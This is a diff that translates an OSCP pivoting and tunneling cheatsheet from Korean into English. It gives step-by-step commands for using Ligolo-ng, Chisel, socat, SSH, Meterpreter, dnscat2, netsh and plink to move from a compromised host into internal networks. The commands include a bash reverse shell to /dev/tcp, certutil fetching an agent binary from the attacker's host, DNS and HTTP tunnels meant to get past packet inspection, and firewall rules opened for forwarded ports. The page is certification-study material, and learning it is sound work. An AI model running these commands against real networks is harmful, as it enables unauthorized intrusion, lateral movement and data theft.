@@ -1,18 +1,18 @@
 ---
-title: "피벗팅 & 터널링 (Pivoting & Tunneling)"
+title: "Pivoting & Tunneling"
 date: 2026-06-20
 weight: 110
 draft: false
 tags: ["oscp", "cheatsheet"]
-summary: "침투한 호스트를 발판으로 Kali가 닿지 않는 내부 네트워크로 나아가는 도구별 절차."
+summary: "Per-tool procedures for moving from a compromised host into internal networks that Kali cannot reach."
 ---
 
-침투한 호스트를 발판으로 Kali가 직접 닿지 않는 내부 네트워크로 나아가는 도구별 절차.
+Per-tool procedures for moving from a compromised host into internal networks that Kali cannot reach directly.
 
-- 출처: https://heretek.dev/oscp-cheatsheet/pivoting-and-tunneling/ (Jean Romero) — 재구성
-- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
+- Source: https://heretek.dev/oscp-cheatsheet/pivoting-and-tunneling/ (Jean Romero) — Reconstructed
+- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
 
-## 의사결정 트리 (Decision Tree)
+## Decision Tree
 
 ```text
 SSH available on pivot host?
@@ -31,9 +31,9 @@ Need SOCKS proxy?
   YES → Chisel reverse SOCKS
 ```
 
-## Ligolo-ng (OSCP AD 피벗에 최선 — ← 선호)
+## Ligolo-ng (best for OSCP AD pivots — ← preferred)
 
-- TUN 인터페이스를 만든다. proxychains 없이 도구를 직접 실행한다.
+- Creates a TUN interface. Run tools directly, without proxychains.
 
 ```bash
 # === ATTACKER SETUP ===
@@ -62,9 +62,9 @@ impacket-psexec 'DOMAIN/user:pass'@10.10.10.5
 » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
 ```
 
-## Chisel (가벼운 대안)
+## Chisel (lightweight alternative)
 
-### 리버스 SOCKS 프록시 (가장 흔함)
+### Reverse SOCKS proxy (most common)
 
 ```bash
 # Attacker:
@@ -77,23 +77,23 @@ impacket-psexec 'DOMAIN/user:pass'@10.10.10.5
 proxychains -q nmap -sT -Pn <internal_ip>
 ```
 
-### 단일 포트 포워드
+### Single port forward
 
 ```bash
 # Target:
 ./chisel client ATTACKER:8080 R:3389:INTERNAL_HOST:3389
 ```
 
-### 다중 포트 포워드
+### Multiple port forwards
 
 ```bash
 # Target:
 ./chisel client ATTACKER:8080 R:3389:10.10.10.5:3389 R:5985:10.10.10.5:5985
 ```
 
-## Socat 포트 포워딩 (SSH 불필요)
+## Socat port forwarding (no SSH needed)
 
-- Socat은 Linux 타깃에 기본 설치된 경우가 많다. 단순 포트 포워드에는 SSH보다 간단하다.
+- Socat is often installed by default on Linux targets. For simple port forwarding it is simpler than SSH.
 
 ```bash
 # Forward port on pivot to internal target
@@ -108,10 +108,10 @@ socat TCP-LISTEN:2222,fork TCP:$TARGET:22
 # From Kali: ssh user@PIVOT_IP -p 2222
 ```
 
-- `-ddd` = 상세 출력(디버깅에 유용). `fork` = 다중 연결 처리.
-- Socat은 포그라운드로 실행된다. 백그라운드로 돌리려면 `&` 또는 `nohup` 사용.
+- `-ddd` = verbose output (useful for debugging). `fork` = handle multiple connections.
+- Socat runs in the foreground. To run it in the background use `&` or `nohup`.
 
-## SSH 터널링 (SSH를 쓸 수 있을 때)
+## SSH tunneling (when SSH is available)
 
 ```bash
 # LOCAL port forward (Kali:localport → through pivot → internal:targetport)
@@ -147,7 +147,7 @@ sshuttle -r user@PIVOT 10.10.10.0/24 -x PIVOT_IP
 ssh -J user@PIVOT user@INTERNAL_IP
 ```
 
-SSH 터널링 플래그 치트시트:
+SSH tunneling flag cheatsheet:
 
 ```text
 -L = Local forward    (Kali listens, traffic goes OUT through pivot)
@@ -157,24 +157,24 @@ SSH 터널링 플래그 치트시트:
 -f = Background       (run tunnel in background)
 ```
 
-## Proxychains 설정
+## Proxychains configuration
 
 ```text
 # /etc/proxychains4.conf — use dynamic_chain
 socks5 127.0.0.1 1080
 ```
 
-- (중요) proxychains을 통한 nmap은 반드시 `-sT`(TCP connect 스캔)와 `-Pn`(핑 생략)을 사용한다.
+- (Important) nmap through proxychains must use `-sT` (TCP connect scan) and `-Pn` (skip ping).
 
 ```bash
 proxychains -q nmap -sT -Pn -p 21,22,80,445,3389,5985 <internal_ip>
 ```
 
-## 이중 / 중첩 피벗 (Attacker → Pivot1 → Pivot2 → Target)
+## Double / nested pivot (Attacker → Pivot1 → Pivot2 → Target)
 
-Ligolo-ng 이중 피벗이 기본 선택 (권장 ← 선호). Chisel은 Ligolo가 깨질 때의 대안.
+Ligolo-ng double pivot is the default choice (recommended ← preferred). Chisel is the fallback when Ligolo breaks.
 
-네트워크 구성:
+Network layout:
 
 ```text
 NETWORK LAYOUT:
@@ -187,7 +187,7 @@ NETWORK LAYOUT:
   Target (192.168.1.x)
 ```
 
-### Step 1 — 첫 번째 피벗 (단일 피벗과 동일)
+### Step 1 — First pivot (same as a single pivot)
 
 ```bash
 # On Kali: create TUN + start proxy
@@ -210,7 +210,7 @@ sudo ip route add $TARGET/24 dev ligolo
 nmap -sT -Pn -p 445 172.16.1.X
 ```
 
-### Step 2 — 에이전트를 Pivot2로 전송
+### Step 2 — Transfer the agent to Pivot2
 
 ```bash
 # On Kali: serve the agent binary (Linux or Windows version)
@@ -226,9 +226,9 @@ certutil -urlcache -f http://KALI_IP/agent.exe C:\temp\agent.exe
 # then transfer from Pivot1 → Pivot2 via SMB/SCP/HTTP
 ```
 
-### Step 3 — Pivot2의 에이전트가 Kali 프록시에 닿게 할 리스너 생성
+### Step 3 — Create a listener so Pivot2's agent can reach the Kali proxy
 
-- (중요) Pivot2는 Kali에 직접 닿을 수 없다(다른 네트워크). Pivot1에 Kali 프록시로 포워드하는 리스너를 추가한다.
+- (Important) Pivot2 cannot reach Kali directly (different network). Add a listener on Pivot1 that forwards to the Kali proxy.
 
 ```bash
 # IMPORTANT: Pivot2 can't reach Kali directly (different network).
@@ -240,7 +240,7 @@ certutil -urlcache -f http://KALI_IP/agent.exe C:\temp\agent.exe
 # This means: anything hitting Pivot1:11602 gets forwarded to Kali:11601
 ```
 
-### Step 4 — Pivot2 에이전트 연결 + 두 번째 터널 생성
+### Step 4 — Connect the Pivot2 agent and create the second tunnel
 
 ```bash
 # On Pivot2: connect agent to Pivot1 (which forwards to Kali's proxy)
@@ -263,7 +263,7 @@ sudo ip route add 192.168.1.0/24 dev ligolo2
 nmap -sT -Pn -p 445 192.168.1.X
 ```
 
-이제 Kali에서 두 내부 네트워크 모두에 직접 닿을 수 있다:
+Now Kali can reach both internal networks directly:
 
 ```bash
 # First network (through ligolo tun):
@@ -273,9 +273,9 @@ nmap -sT -Pn 192.168.1.0/24
 evil-winrm -i 192.168.1.5 -u admin -p password
 ```
 
-### 이중 피벗 너머에서 리버스 셸 받기
+### Catching a reverse shell beyond a double pivot
 
-- Target(192.168.1.x)이 보내는 리버스 셸은 Pivot2에만 닿을 수 있다. 리스너를 Kali까지 체이닝해야 한다.
+- A reverse shell from Target (192.168.1.x) can only reach Pivot2. You must chain a listener all the way to Kali.
 
 ```bash
 # Step 1: In ligolo console — select the PIVOT2 session
@@ -291,7 +291,7 @@ bash -c 'bash -i >& /dev/tcp/192.168.1.PIVOT2/4444 0>&1'
 # Flow: Target → Pivot2:4444 → listener_add → Kali:4444 → shell!
 ```
 
-### Chisel 이중 피벗 (대안 — Ligolo가 깨질 때 사용)
+### Chisel double pivot (alternative — use when Ligolo breaks)
 
 ```bash
 # Hop 1: Pivot1 → Kali
@@ -321,13 +321,13 @@ proxychains -q nmap -sT -Pn -p 445,5985 192.168.1.0/24
 proxychains -q evil-winrm -i 192.168.1.5 -u admin -p password
 ```
 
-- ← 선호: Ligolo-ng가 기본. proxychains 불필요, 도구가 네이티브로 동작, 덜 깨진다. Chisel은 Ligolo가 실패했을 때만.
+- ← Preferred: Ligolo-ng is the default. No proxychains, tools work natively, and it breaks less often. Use Chisel only when Ligolo fails.
 
-## HTTP 터널링 (DPI가 SSH/RAW TCP를 막을 때)
+## HTTP tunneling (when DPI blocks SSH/raw TCP)
 
-- 사용 시나리오: 심층 패킷 검사(DPI)가 HTTP/HTTPS 외의 트래픽을 전부 막을 때. Chisel은 트래픽을 HTTP로 감싸고 내부적으로 SSH로 암호화한다.
+- Use case: deep packet inspection (DPI) blocks everything except HTTP/HTTPS. Chisel wraps traffic in HTTP and encrypts it internally with SSH.
 
-### Chisel HTTP 터널 (DPI 통과)
+### Chisel HTTP tunnel (passes DPI)
 
 ```bash
 # On Kali — start Chisel server
@@ -341,9 +341,9 @@ proxychains -q nmap -sT -Pn -p 445,5985 INTERNAL_IP
 proxychains -q evil-winrm -i INTERNAL_IP -u user -p pass
 ```
 
-- DPI를 통과하는 이유: Chisel이 모든 트래픽을 HTTP 요청 안에 캡슐화한다. DPI에는 평범한 HTTP 트래픽으로 보이고, 내부의 SSH 암호화가 내용 검사를 막는다.
+- Why it passes DPI: Chisel encapsulates all traffic inside HTTP requests. To DPI it looks like ordinary HTTP traffic, and the inner SSH encryption prevents content inspection.
 
-단일 포트 포워드 (HTTP 경유):
+Single port forward (over HTTP):
 
 ```bash
 # Forward specific internal port to Kali
@@ -351,9 +351,9 @@ proxychains -q evil-winrm -i INTERNAL_IP -u user -p pass
 # Now on Kali: evil-winrm -i 127.0.0.1 -u user -p pass
 ```
 
-## Meterpreter 피벗 (이미 Meterpreter 세션이 있을 때)
+## Meterpreter pivot (when you already have a Meterpreter session)
 
-- Ligolo/Chisel의 대안. autoroute + SOCKS 프록시를 사용한다.
+- An alternative to Ligolo/Chisel. Uses autoroute + SOCKS proxy.
 
 ```bash
 # Step 1: Create staged Meterpreter payload
@@ -382,7 +382,7 @@ set SRVPORT 1080
 run -j
 ```
 
-`/etc/proxychains4.conf`에 `socks5 127.0.0.1 1080` 설정 후 proxychains로 사용:
+Set `socks5 127.0.0.1 1080` in `/etc/proxychains4.conf`, then use proxychains:
 
 ```bash
 proxychains -q nmap -sT -Pn -p 445,3389,5985 INTERNAL_SUBNET/24
@@ -390,18 +390,18 @@ proxychains -q evil-winrm -i INTERNAL_IP -u USER -p PASS
 proxychains -q impacket-psexec 'DOMAIN/USER:PASS'@INTERNAL_IP
 ```
 
-단일 포트 포워드 (SOCKS 없이):
+Single port forward (without SOCKS):
 
 ```text
 meterpreter> portfwd add -l 4455 -p 445 -r INTERNAL_IP
 # Now on Kali: smbclient //127.0.0.1:4455/share
 ```
 
-## DNS 터널링 (DNS 트래픽만 허용될 때)
+## DNS tunneling (when only DNS traffic is allowed)
 
-- 사용 시나리오: 타깃이 DNS 질의(53 포트)만 가능할 때. 매우 느리지만 다른 방법이 전부 막혔을 때 동작한다. 도구: dnscat2.
+- Use case: the target can only make DNS queries (port 53). Very slow, but it works when everything else is blocked. Tool: dnscat2.
 
-### 셋업
+### Setup
 
 ```bash
 # On Kali — start DNS server
@@ -414,7 +414,7 @@ sudo dnscat2-server --dns host=0.0.0.0,port=53
 # Windows: dnscat2-v0.07-client-win32.exe --dns server=KALI_IP
 ```
 
-### dnscat2 세션 사용
+### Using a dnscat2 session
 
 ```text
 dnscat2> windows              # list active sessions
@@ -423,20 +423,20 @@ command (client01)> shell     # spawn a shell
 command (client01)> download C:\Users\admin\Desktop\proof.txt
 ```
 
-### DNS 터널을 통한 포트 포워딩
+### Port forwarding over a DNS tunnel
 
 ```text
 command (client01)> listen 127.0.0.1:4444 INTERNAL_IP:445
 # Now Kali can access INTERNAL_IP:445 via 127.0.0.1:4444
 ```
 
-- DNS 터널링은 극도로 느리다. HTTP 터널링까지 실패한 최후의 수단으로만 사용한다.
+- DNS tunneling is extremely slow. Use it only as a last resort after HTTP tunneling has also failed.
 
-## Windows 포트 포워딩 (외부 도구 없이)
+## Windows port forwarding (without external tools)
 
-- 사용 시나리오: Ligolo/Chisel을 타깃에 업로드할 수 없을 때.
+- Use case: you cannot upload Ligolo/Chisel to the target.
 
-### netsh (Windows 내장)
+### netsh (built into Windows)
 
 ```powershell
 # Forward local port to internal target
@@ -449,7 +449,7 @@ netsh interface portproxy show all
 netsh interface portproxy delete v4tov4 listenport=4455 listenaddress=0.0.0.0
 ```
 
-- (중요) 방화벽 규칙도 거의 항상 필요하다. Windows 방화벽이 인바운드를 막고 있으면 portproxy만으로는 무용지물.
+- (Important) You almost always need a firewall rule too. If the Windows firewall blocks inbound traffic, portproxy alone is useless.
 
 ```powershell
 # Poke a hole in the firewall for the forwarded port
@@ -459,9 +459,9 @@ netsh advfirewall firewall add rule name="port_fwd_4455" protocol=TCP dir=in loc
 netsh advfirewall firewall delete rule name="port_fwd_4455"
 ```
 
-- Kali에서: `smbclient //PIVOT_IP:4455/share`
+- From Kali: `smbclient //PIVOT_IP:4455/share`
 
-### ssh.exe (Windows 10 1803+ / Server 2019+ 내장)
+### ssh.exe (built into Windows 10 1803+ / Server 2019+)
 
 ```powershell
 # Check if available
@@ -476,14 +476,14 @@ ssh -N -R 9998 kali@KALI_IP
 ssh -N -R 127.0.0.1:4455:INTERNAL_IP:445 kali@KALI_IP
 ```
 
-- ssh.exe는 원격 다이내믹을 포함한 모든 OpenSSH 기능을 지원한다. 사용 가능하면 plink보다 우선한다.
+- ssh.exe supports all OpenSSH features, including remote dynamic. Prefer it over plink when available.
 
-### plink.exe (PuTTY CLI — ssh.exe가 없을 때 대체)
+### plink.exe (PuTTY CLI — fallback when ssh.exe is missing)
 
 ```powershell
 # Remote port forward (target → Kali)
 plink.exe -ssh -l kali -pw kalipass -R 127.0.0.1:9833:127.0.0.1:3389 KALI_IP
 ```
 
-- (중요) Plink는 원격 다이내믹 포트 포워딩(`-R socks`)을 지원하지 않는다. SOCKS에는 ssh.exe나 Chisel을 사용한다.
-- Kali에서 plink.exe 위치: `/usr/share/windows-resources/binaries/plink.exe`
+- (Important) Plink does not support remote dynamic port forwarding (`-R socks`). For SOCKS use ssh.exe or Chisel.
+- On Kali, plink.exe is at: `/usr/share/windows-resources/binaries/plink.exe`
